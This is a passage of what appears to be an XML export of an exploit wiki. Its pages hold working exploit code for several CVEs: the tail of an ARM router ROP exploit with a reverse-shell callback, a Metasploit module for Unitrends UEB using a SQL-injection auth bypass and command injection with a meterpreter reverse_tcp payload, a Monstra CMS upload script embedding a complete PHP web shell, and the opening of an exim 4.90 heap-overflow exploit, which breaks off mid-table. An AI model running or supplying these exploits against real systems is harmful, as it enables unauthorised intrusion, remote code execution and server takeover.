            pop = struct.pack("&lt;I", curr_libc + ****)
            #: mov r0, sp ; blx r3
            mv_r0_sp = struct.pack("&lt;I", curr_libc + ****)
 
            password = "A"*offset
            password += pop + system + "B"*8 + mv_r0_sp + command + ".gif"
 
            print "[+] Beginning brute force."
            while not DONE:
                        i += 1               
                        print "[+] Attempt %d" %i
 
                        #build the request, with the malicious password field
                        req = urllib2.Request(url)                    
                        req.add_header("Cookie", "password=%s"%password)
 
                        #The request will throw an exception when we crash the server,
                        #we don't care about this, so don't handle it.
                        try:
                                    resp = urllib2.urlopen(req)
                        except:
                                    pass
 
                        #Give the device some time to restart the
                        time.sleep(1)
 
            print "[+] Exploit done"
 
 
def main():
            parser = OptionParser()
            parser.add_option("-t", "–target", dest="host_ip", help="IP address of the target")
            parser.add_option("-p", "–port", dest="host_port", help="Port of the targets webserver")
            parser.add_option("-c", "–comp-path", dest="compiler_path", help="path to arm cross compiler")
            parser.add_option("-m", "–my-ip", dest="my_ip", help="your ip address")
 
            options, args = parser.parse_args()
 
            host_ip = options.host_ip
            host_port = options.host_port
            comp_path = options.compiler_path
            my_ip = options.my_ip
 
            if host_ip == None or host_port == None:
                        parser.error("[x] A target ip address (-t) and port (-p) are required")
 
            if comp_path == None:
                        parser.error("[x] No compiler path specified, you need a uclibc arm cross compiler, such as https://www.uclibc.org/downloads/binaries/0.9.30/cross-compiler-arm4l.tar.bz2")
 
            if my_ip == None:
                        parser.error("[x] Please pass your ip address (-m)")
 
 
            if not compile_shell(comp_path, my_ip):
                        print "[x] Exiting due to error in compiling shell"
                        return -1
 
            httpd_thread = threading.Thread(target=start_http_server)
            httpd_thread.daemon = True
            httpd_thread.start()
           
            conn_listener = threading.Thread(target=threaded_listener)
            conn_listener.start()
 
            #Give the thread a little time to start up, and fail if that happens
            time.sleep(3)
 
            if not conn_listener.is_alive():
                        print "[x] Exiting due to conn_listener error"
                        return -1
           
 
            exploit(host_ip, host_port, my_ip)
           
           
            conn_listener.join()
           
            return 0
 
           
 
if __name__ == '__main__':
            main()
&lt;/pre&gt;</text>
      <sha1>ofdwhvkzmeptaswh5jhptz93g34dz0i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-6328 Unitrends UEB HTTP API 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1205</id>
    <revision>
      <id>1510</id>
      <timestamp>2021-04-11T01:24:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule..."</comment>
      <origin>1510</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4246" sha1="hom0okijv0xv0fjvvpuzdax3zdtz53m" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           =&gt; 'Unitrends UEB http api remote code execution',
      'Description'    =&gt; %q{
        It was discovered that the api/storage web interface in Unitrends Backup (UB)
        before 10.0.0 has an issue in which one of its input parameters was not validated.
        A remote attacker could use this flaw to bypass authentication and execute arbitrary
        commands with root privilege on the target system.
        UEB v9 runs the api under root privileges and api/storage is vulnerable.
        UEB v10 runs the api under limited privileges and api/hosts is vulnerable.
      },
      'Author'         =&gt;
        [
          'Cale Smith',    # @0xC413
          'Benny Husted', # @BennyHusted
          'Jared Arave',   # @iotennui
          'h00die'
        ],
      'License'        =&gt; MSF_LICENSE,
      'Platform'       =&gt; 'linux',
      'Arch' =&gt; [ARCH_X86],
      'CmdStagerFlavor' =&gt; [ 'printf' ],
      'References'     =&gt;
        [
          ['URL', 'https://support.unitrends.com/UnitrendsBackup/s/article/ka640000000TO5PAAW/000005756'],
          ['URL', 'https://support.unitrends.com/UnitrendsBackup/s/article/000006002'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2017-12478'],
          ['URL', 'http://blog.redactedsec.net/exploits/2018/01/29/UEB9.html'],
          ['EDB', '44297'],
          ['CVE', '2017-12478'],
          ['CVE', '2018-6328']
        ],
      'Targets'        =&gt;
        [
          [ 'UEB 9.*', { 'Privileged' =&gt; true} ],
          [ 'UEB &lt; 10.1.0', { 'Privileged' =&gt; false} ]
        ],
      'DefaultOptions' =&gt; {
          'PAYLOAD' =&gt; 'linux/x86/meterpreter/reverse_tcp',
          'SSL' =&gt; true
        },
      'DisclosureDate'  =&gt; 'Aug 8 2017',
      'DefaultTarget'   =&gt; 0))
    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true])
      ])
    deregister_options('SRVHOST', 'SRVPORT')
  end

  def auth_token
    session = "v0:b' UNION SELECT -1 -- :1:/usr/bp/logs.dir/gui_root.log:0"  #SQLi auth bypass
    Base64.strict_encode64(session) #b64 encode session token
  end

  def check
    res = send_request_cgi!({
        'method' =&gt; 'GET',
        'uri'    =&gt; '/api/systems/details',
        'ctype'  =&gt; 'application/json',
        'headers' =&gt;
        {'AuthToken' =&gt; auth_token}
      })
    if res &amp;&amp; res.code == 200
      print_good("Good news, looks like a vulnerable version of UEB.")
      return CheckCode::Appears
    else
      print_bad('Host does not appear to be vulnerable.')
    end
    return CheckCode::Safe
  end

  #substitue some charactes
  def filter_bad_chars(cmd)
    cmd.gsub!("\\", "\\\\\\")
    cmd.gsub!("'", '\\"')
  end

  def execute_command(cmd, opts = {})
    if target.name == 'UEB 9.*'
      #substitue the cmd into the hostname parameter
      parms = %Q|{"type":4,"name":"_Stateless","usage":"stateless","build_filesystem":1,"properties":{"username":"aaaa","password":"aaaa","hostname":"`|
      parms &lt;&lt; filter_bad_chars(cmd)
      parms &lt;&lt; %Q|` &amp;","port":"2049","protocol":"nfs","share_name":"aaa"}}|
      uri = '/api/storage'
    elsif target.name == 'UEB &lt; 10.1.0'
      parms = %Q|{"name":"ffff","ip":"10.0.0.200'\\"`0&amp;|
      parms &lt;&lt; filter_bad_chars(cmd)
      parms &lt;&lt; %Q|`'"}|
      uri = '/api/hosts'
    end

    res = send_request_cgi({
      'uri' =&gt; uri,
      'method' =&gt; 'POST',
      'ctype'  =&gt; 'application/json',
      'encode_params' =&gt; false,
      'data'   =&gt; parms,
      'headers' =&gt;
        {'AuthToken' =&gt; auth_token}
    })

    if res &amp;&amp; res.code != 500
      fail_with(Failure::UnexpectedReply,'Unexpected response')
    end
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
  end

  def exploit
    print_status("#{peer} - Sending requests to UEB...")
    execute_cmdstager(:linemax =&gt; 120)
  end
end

&lt;/pre&gt;</text>
      <sha1>hom0okijv0xv0fjvvpuzdax3zdtz53m</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-6383 Monstra CMS 3.0.4 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>3458</id>
    <revision>
      <id>4025</id>
      <timestamp>2021-06-04T12:01:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Monstra CMS 3.0.4 - Remote Code Execution (Authenticated) # Date: 03.06.2021 # Exploit Author: Ron Jost (hacker5preme) # Vendor Homepage: https:..."</comment>
      <origin>4025</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="21720" sha1="3fa9oi2trqz4n3svtnexv855iiq9znh" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)
# Date: 03.06.2021
# Exploit Author: Ron Jost (hacker5preme)
# Vendor Homepage: https://monstra.org/
# Software Link: https://monstra.org/monstra-3.0.4.zip
# Version: 3.0.4
# Tested on: Ubuntu 20.04
# CVE: CVE-2018-6383
# Documentation: https://github.com/Hacker5preme/Exploits#CVE-2018-6383-Exploit

'''
Description:
Monstra CMS through 3.0.4 has an incomplete "forbidden types" list that excludes .php (and similar) file extensions
but not the .pht or .phar extension, which allows remote authenticated Admins or Editors to execute arbitrary PHP code
 by uploading a file, a different vulnerability than CVE-2017-18048.
'''


'''
Import required modules:
'''
import argparse
import requests


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Exploit for CVE-2018-6383')
my_parser.add_argument('-T', type=str, help='Target IP')
my_parser.add_argument('-P', type=str, help='Target Port')
my_parser.add_argument("-U", type=str, help="Monstra CMS Path")
my_parser.add_argument('-u', type=str, help="Username")
my_parser.add_argument('-p', type=str, help='Password')
args = my_parser.parse_args()
target_ip = args.T
target_port = args.P
Monstracms_path = args.U
username = args.u
password = args.p


'''
Exploit:
'''
# Cookies:
session = requests.Session()
url = "http://" + target_ip + ':' + target_port + Monstracms_path + 'admin/index.php'
cookies = session.get(url).cookies.get_dict()
value = cookies['PHPSESSID']
cookies = {
    "__atuvc": "9%7C22",
    'PHPSESSID': 'sga7s1jb0o3b7dlueh5soin8a9'
}

# Construct authentication header:
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Referer": "http://" + target_ip + ':' + target_port + Monstracms_path + 'admin/index.php',
    "Upgrade-Insecure-Requests": "1"}

# Construct authentication body
body = {
    "login": username,
    "password": password,
    "login_submit": "Log In"}
x = requests.post(url, headers=headers, cookies=cookies, data=body)

# Construct Exploit link:
url = "http://" + target_ip + ':' + target_port + Monstracms_path + 'admin/index.php?id=filesmanager'

# Construct Exploit header:
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------27822155982314896762160847658",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Referer": "http://" + target_ip + Monstracms_path + 'admin/index.php?id=filesmanager',
    "Upgrade-Insecure-Requests": "1"
}

# Construct Exploit data:
burp0_data = "-----------------------------27822155982314896762160847658\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\n1e71963993909d612c40962b401c556b70e9bb3c\r\n-----------------------------27822155982314896762160847658\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------27822155982314896762160847658\r\nContent-Disposition: form-data; name=\"upload_file\"\r\n\r\nUpload\r\n-----------------------------27822155982314896762160847658--\r\n"

# Exploit:
x = requests.post(url, headers=header, cookies=cookies, data=burp0_data)

# Finish:
print('')
print('Please login in your webrowser and then open the following URL:')
print('File uploaded to: http://' + target_ip + ':' + target_port + Monstracms_path + 'public/uplaods/shell.phar')
print('')
&lt;/pre&gt;</text>
      <sha1>3fa9oi2trqz4n3svtnexv855iiq9znh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-6789 exim 4.90 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1202</id>
    <revision>
      <id>1506</id>
      <timestamp>2021-04-11T01:21:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: exim 4.90 - Remote Code Execution # Date: 2018-10-24 # Exploit Author: hackk.gr # Vendor Homepage: exim.org # Version: exim &lt; 4.90 # Tested on:..."</comment>
      <origin>1506</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="13336" sha1="1l1s0xipoc3dlz40mfer339r6uudgyx" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: exim 4.90 - Remote Code Execution
# Date: 2018-10-24
# Exploit Author: hackk.gr
# Vendor Homepage: exim.org
# Version: exim &lt; 4.90
# Tested on: debian exim 4.89, ubuntu exim 4.86_2
# CVE : CVE-2018-6789
 
#!/usr/bin/python
#debian exim 4.89
#ubuntu exim 4.86_2
import time
import socket
import struct
import os
import os.path
import sys
import ssl
import random
from multiprocessing import Process, Queue
 
s = None
f = None
test = True
rcpt_index_start = 0x120
bufsize = 8200
 
def connect(host, port):
   global s
   global f
   s = socket.create_connection((host,port))
   f = s.makefile("rw", bufsize=0)
 
def p(v):
   return struct.pack("&lt;Q", v)
 
def readuntil(delim='\n'):
   data = ''
   auth_plain_available = False
   while True:
    
    l = f.readline()
    if l == "":
      return ""
      
    if l.find("PLAIN") &gt; -1:
      auth_plain_available = True  
      
    if test:
      if len(l) &gt; 70:
       sys.stdout.write(l[:70] + " ...\n")
       sys.stdout.flush()
      else:
       print l.strip("\r").strip("\n")
      
    data = data + l
    if data.find(delim) &gt; -1:
     return data
    if l == "\n" or l == "":
     return ""
   return data
 
def write(data):
   f.write(data + "\n")
def ehlo(v):
   write("EHLO " + v)
   return readuntil('HELP')
def unrec(v):
   write(v)
   readuntil('command')
def auth_plain(v):
   encode = v.encode('base64').replace('\n','').replace('=','')
   write("AUTH PLAIN " + encode)
   l = f.readline()
   if test:
    if l.find("not advert") &gt; -1 or l.find("not supported")&gt; -1:
     raise Exception("NO AUTH PLAIN CONFIG")
    print l
def auth_plain1(v):
   encode = v.encode('base64').replace('\n','').replace('=','')
   write("AUTH PLAIN " + encode)
   l = f.readline()
   if test:
    if l.find("Incorrect") &gt; -1:
     raise Exception("WRONG DRIVER")
    if l.find("not advert") &gt; -1 or l.find("not supported")&gt; -1:
     raise Exception("NO AUTH PLAIN CONFIG")
    print l
def auth_plain2(v,value):
   encode = v.encode('base64').replace('\n','').replace('=','')
   value = chr(value).encode('base64').replace('\n','').replace('=','')
   write("AUTH PLAIN " + encode[:-1] + value)
   l = f.readline()
   if test:
    if l.find("Incorrect") &gt; -1:
     raise Exception("WRONG DRIVER")
    if l.find("not advert") &gt; -1 or l.find("not supported")&gt; -1:
     raise Exception("NO AUTH PLAIN CONFIG")
    print l
def one_byte_overwrite():
   v = "C" * bufsize
   encode = v.encode('base64').replace('\n','').replace('=','')
   encode = encode[:-1] + "PE"
   write("AUTH PLAIN " + encode)
   l = f.readline()
   if test:
    if l.find("Incorrect") &gt; -1:
     raise Exception("WRONG DRIVER")
    if l.find("not advert") &gt; -1 or l.find("not supported")&gt; -1:
     raise Exception("NO AUTH PLAIN CONFIG")
    print l
 
lookup_table = {0x00: [0,3],
0x01: [0,7],
0x02: [0,11],
0x03: [0,15],
0x04: [0,19],
0x05: [0,23],
0x06: [0,27],
0x07: [0,31],
0x08: [0,35],
0x09: [0,39],
0x0a: [0,43],
0x0b: [0,47],
0x0c: [0,51],
0x0d: [0,55],
0x0e: [0,59],
0x0f: [0,63],
0x10: [0,67],
0x11: [0,71],
0x12: [0,75],
0x13: [0,79],
0x14: [0,83],
0x15: [0,87],
0x16: [0,91],
0x17: [0,95],
0x18: [0,99],
0x19: [0,103],
0x1a: [0,107],
0x1b: [0,111],
0x1c: [0,115],
0x1d: [0,119],
0x1e: [0,123],
0x1f: [0,127],
0x20: [0,131],
0x21: [0,135],
0x22: [0,139],
0x23: [0,143],
0x24: [0,147],
0x25: [0,151],
0x26: [0,155],
0x27: [0,159],
0x28: [0,163],
0x29: [0,167],
0x2a: [0,171],
0x2b: [0,175],
0x2c: [0,179],
0x2d: [0,183],
0x2e: [0,187],
0x2f: [0,191],
0x30: [0,195],
0x31: [0,199],
0x32: [0,203],
0x33: [0,207],
0x34: [0,211],
0x35: [0,215],
0x36: [0,219],
0x37: [0,223],
0x38: [0,227],
0x39: [0,231],
0x3a: [0,235],
0x3b: [0,239],
0x3c: [0,243],
